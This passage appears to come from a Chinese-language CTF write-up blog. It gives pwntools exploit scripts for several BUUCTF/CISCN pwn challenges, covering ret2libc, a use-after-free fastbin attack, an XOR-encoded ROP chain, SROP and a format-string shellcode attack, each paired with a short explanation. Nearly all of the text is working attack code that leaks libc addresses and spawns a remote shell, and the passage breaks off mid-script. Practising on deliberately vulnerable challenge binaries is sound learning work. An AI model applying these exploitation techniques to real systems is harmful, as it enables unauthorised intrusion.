class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_en_2&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_en_2&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input your choice!&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Input your Plaintext to be encrypted&quot;)</span><br><span class="line">	payload  &#x3D; &quot;a\x00&quot;</span><br><span class="line">	offset &#x3D; 88</span><br><span class="line">	pop_rdi_ret &#x3D; 0x400c83</span><br><span class="line">	payload  &#x3D; &quot;a&quot; * offset</span><br><span class="line">	payload +&#x3D; p64(pop_rdi_ret) + p64(elf.got[&#39;__libc_start_main&#39;]) + p64(elf.plt[&#39;puts&#39;])</span><br><span class="line">	payload +&#x3D; p64(elf.symbols[&#39;_start&#39;])</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	libc &#x3D; u64(sh.recvuntil(&quot;\x7f\x0a&quot;,)[-7:].ljust(8,&quot;\x00&quot;)) % 0x1000000000000 - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	</span><br><span class="line">        sh.recvuntil(&quot;Input your choice!&quot;)</span><br><span class="line">        sh.sendline(&quot;1&quot;)</span><br><span class="line">        sh.recvuntil(&quot;Input your Plaintext to be encrypted&quot;)</span><br><span class="line">        payload  &#x3D; &quot;a\x00&quot;</span><br><span class="line">        offset &#x3D; 88</span><br><span class="line">        payload  &#x3D; &quot;a&quot; * offset</span><br><span class="line">        payload +&#x3D; p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">        sh.sendline(payload)	</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20123,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x20-ciscn-s-4">0x20 ciscn_s_4</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_s_4&quot;)</span><br><span class="line">lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x86_libc.so.6&quot;)</span><br><span class="line">#nc 172.29.9.107 9999 </span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_s_4&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	pop3_ret &#x3D; 0x08048699</span><br><span class="line">	pop2_ret &#x3D; 0x0804869a</span><br><span class="line">	offset &#x3D; 44</span><br><span class="line">	main_addr &#x3D; 0x080485FF</span><br><span class="line">	payload &#x3D; (offset-12) * &#39;a&#39; + p32(0x0804A01C) + &quot;2&quot;*4 + &quot;3&quot;*4+ p32(main_addr)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	payload &#x3D; (offset-0x10) * &quot;b&quot;+&quot;5&quot;*4 +p32(0x0804A01C)+&quot;7&quot;*4+&quot;8&quot;*4 +p32(0x0804861D)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	sh.recv(33-4-4)</span><br><span class="line">	libc &#x3D; u32(sh.recv(4)) - lib.symbols[&quot;__libc_start_main&quot;]</span><br><span class="line">	log.success(&quot;libc :&quot; + hex(libc))</span><br><span class="line">	system &#x3D; 0x08048559</span><br><span class="line">	binsh &#x3D; libc + next(lib.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class="line">	log.success(&quot;binsh :&quot;+hex(binsh))</span><br><span class="line">	log.success(&quot;system :&quot;+hex(libc + lib.symbols[&#39;system&#39;]))</span><br><span class="line">	#input()</span><br><span class="line">	payload &#x3D; (offset)*&quot;a&quot; + p32(0x08048450)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	payload &#x3D; (offset-12) * &#39;a&#39; + p32(binsh) + &quot;2&quot;*4 + &quot;3&quot;*4+ p32(main_addr)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	payload &#x3D; (offset-0x10) * &quot;b&quot;+&quot;5&quot;*4 +p32(binsh)+&quot;7&quot;*4+&quot;8&quot;*4 +p32(system)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	#sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20155,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x21-ciscn-2019-n-3">0x21 ciscn_2019_n_3</h2>
<h2 id="1、利用unsorted-bin-attack知道libc地址">1、利用unsorted bin attack知道libc地址</h2>
<h2 id="2、存在UAF漏洞，然后利用fastbin-attack，实现堆块重叠，且通过利用unsorted-bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串">2、存在UAF漏洞，然后利用fastbin attack，实现堆块重叠，且通过利用unsorted bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_n_3&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def addStr(idx,size,content):</span><br><span class="line">	sh.recvuntil(&quot;CNote &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;Type &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Length &gt; &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	if content !&#x3D; &quot;&quot;:</span><br><span class="line">		sh.recvuntil(&quot;Value &gt; &quot;)</span><br><span class="line">		sh.send(content)</span><br><span class="line">def addInt(idx,num):</span><br><span class="line">        sh.recvuntil(&quot;CNote &gt; &quot;)</span><br><span class="line">        sh.sendline(&quot;1&quot;)</span><br><span class="line">        sh.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line">        sh.recvuntil(&quot;Type &gt; &quot;)</span><br><span class="line">        sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Value &gt; &quot;)</span><br><span class="line">	sh.sendline(str(num))</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;CNote &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;CNote &gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_n_3&quot;)</span><br><span class="line">		main_arena_offset &#x3D; 0xf7763780 - 0xf75b1000</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x86_libc.so.6&quot;)</span><br><span class="line">		main_arena_offset &#x3D; 0x1B0780</span><br><span class="line">	#leak libc</span><br><span class="line">	addStr(0,0x80,&quot;a&quot;*0x7E + &quot;\n&quot;)</span><br><span class="line">	addInt(1,0xdeadbeef)</span><br><span class="line">	free(0)</span><br><span class="line">	addStr(2,0,&quot;&quot;)</span><br><span class="line">	show(2)</span><br><span class="line">	sh.recvuntil(&quot;Note(Type&#x3D;String, Value&#x3D;&quot;)</span><br><span class="line">	main_arena &#x3D; u32(sh.recv(4)) - 176</span><br><span class="line">	libc &#x3D; main_arena - main_arena_offset</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	one_gadget &#x3D; libc + 0x3a80c</span><br><span class="line"></span><br><span class="line">	#getShell</span><br><span class="line">        addStr(3,0x48,&quot;a&quot;*0x3E + &quot;\n&quot;)</span><br><span class="line">	addInt(4,0xdeadbeef)</span><br><span class="line">	free(4)</span><br><span class="line">	payload &#x3D; &quot;sh\x00\x00&quot; + p32(system) + p32(0xdeadbeef) + &#39;\n&#39;</span><br><span class="line">	addStr(5,0x14,payload)	</span><br><span class="line">	free(4)</span><br><span class="line">	log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">        log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">        log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">        log.success(&quot;libc: &quot; + hex(libc))	</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20139,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x22-ciscn-s-8">0x22 ciscn_s_8</h2>
<h3 id="导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload">导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload</h3>
<h3 id="另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add-rax-1换成add-rax-3，缩短ROPchain，达成攻击。注意不换成add-rax-3会出现ROPchain被截断的情况">另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add rax,1换成add rax,3，缩短ROPchain，达成攻击。注意不换成add rax,3会出现ROPchain被截断的情况</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_s_8&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def encrypt(data):</span><br><span class="line">	crypto &#x3D; &#39;&#39;</span><br><span class="line">	for i in data:</span><br><span class="line">		crypto +&#x3D; chr(ord(i) ^ 0x66)</span><br><span class="line">	return crypto</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_s_8&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	from struct import pack</span><br><span class="line"></span><br><span class="line">	# Padding goes here</span><br><span class="line">	p &#x3D; &#39;&#39;</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006ba0e0) # @ .data</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret</span><br><span class="line">	p +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006ba0e0) # @ .data</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000449bf5) # pop rdx ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474c11) # add rax, 3 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000474bf8) # add rax, 2 ; ret</span><br><span class="line">	p +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004751a5) # syscall ; ret</span><br><span class="line">	offset &#x3D; 10 * 8</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p</span><br><span class="line">	sh.send(encrypt(payload))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20159,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x23-ciscn-s-3">0x23 ciscn_s_3</h2>
<h3 id="gadget处可以赋值rax为15，恰好为SYS-SigReturnFrame">gadget处可以赋值rax为15，恰好为SYS_SigReturnFrame</h3>
<h3 id="那么思路如下">那么思路如下:</h3>
<h3 id="1、先leak-stack地址，然后顺带的传入-bin-sh-x00字符串，通过leak-stack来定位binsh的位置，再跳回SYS-read处">1、先leak stack地址，然后顺带的传入/bin/sh\x00字符串，通过leak stack来定位binsh的位置，再跳回SYS_read处</h3>
<h3 id="2、赋值rax为15，跳到syscall上，成功popal-sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell">2、赋值rax为15，跳到syscall上，成功popal sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_s_6&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_s_6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line"></span><br><span class="line">	syscall_ret &#x3D; 0x400517</span><br><span class="line">	mov_rax_ret &#x3D; 0x4004DA</span><br><span class="line">	write_ret &#x3D; 0x400503</span><br><span class="line">	read_write_ret &#x3D; 0x4004F1</span><br><span class="line">	offset &#x3D; 16</span><br><span class="line">	payload  &#x3D; &quot;&#x2F;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">	payload  &#x3D; payload.ljust(offset,&quot;a&quot;)</span><br><span class="line">	payload +&#x3D; p64(write_ret) + p64(read_write_ret)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	stack_addr &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))</span><br><span class="line">	binsh &#x3D; stack_addr - 0x118</span><br><span class="line">	sigframe &#x3D; SigreturnFrame()</span><br><span class="line">	sigframe.rax &#x3D; constants.SYS_execve</span><br><span class="line">	sigframe.rdi &#x3D; binsh</span><br><span class="line">	sigframe.rsp &#x3D; stack_addr</span><br><span class="line">	sigframe.rip &#x3D; syscall_ret</span><br><span class="line">	sigframe.rsi &#x3D; 0</span><br><span class="line">	sigframe.rdx &#x3D; 0</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot; + p64(mov_rax_ret) + p64(syscall_ret) + str(sigframe)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	log.success(&quot;stack_addr: &quot; + hex(stack_addr))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20154,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x24-ciscn-2019-nw-6">0x24 ciscn_2019_nw_6</h2>
<h3 id="程序没有任何保护，考虑shellcode">程序没有任何保护，考虑shellcode</h3>
<h3 id="利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去">利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_nw_6&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_nw_6&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	#0804A160</span><br><span class="line">	#leak ebp</span><br><span class="line">	sh.recv()</span><br><span class="line">	payload &#x3D; &quot;%12$p&quot;</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil(&quot;0x&quot;)</span><br><span class="line">	ebp &#x3D; int(sh.recv(8),16)</span><br><span class="line">	ret_addr &#x3D; ebp + 0xc - 